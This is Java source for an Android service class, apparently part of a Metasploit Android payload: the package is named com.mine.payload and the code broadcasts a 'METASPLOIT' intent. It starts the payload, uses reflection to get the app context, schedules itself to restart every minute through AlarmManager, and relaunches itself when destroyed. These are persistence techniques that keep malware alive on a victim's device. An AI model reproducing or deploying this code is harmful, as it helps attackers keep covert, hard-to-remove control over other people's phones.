package com.mine.payload;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.SystemClock;

import java.lang.reflect.Method;

public class MainService extends Service {
    public static void start() {
        try {
            Method method = Class.forName("android.app.ActivityThread").getMethod("currentApplication", new Class[0]);
            Context context = (Context) method.invoke(null, null);
            if (context == null) {
                new Handler(Looper.getMainLooper()).post(new RunnableC0002c(method));
            } else {
                startService(context);
            }
        } catch (Exception e) {
        }
    }

    public static void startService(Context context) {
        context.startService(new Intent(context, MainService.class));
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public int onStartCommand(Intent intent, int i, int i2) {
        Payload.start(this);
        AlarmManager manager = (AlarmManager) getSystemService(ALARM_SERVICE);
        int restarttime = 60 * 1000; // one minute
        long triggerAtTime = SystemClock.elapsedRealtime() + restarttime;
        Intent i1 = new Intent("METASPLOIT");
        PendingIntent pi = PendingIntent.getBroadcast(this, 0, i1, 0);
        manager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtTime, pi);
        return START_STICKY;
    }
    @Override
    public void onDestroy() {
        Intent localIntent = new Intent();
        localIntent.setClass(this, MainService.class);
        this.startService(localIntent);
    }
}
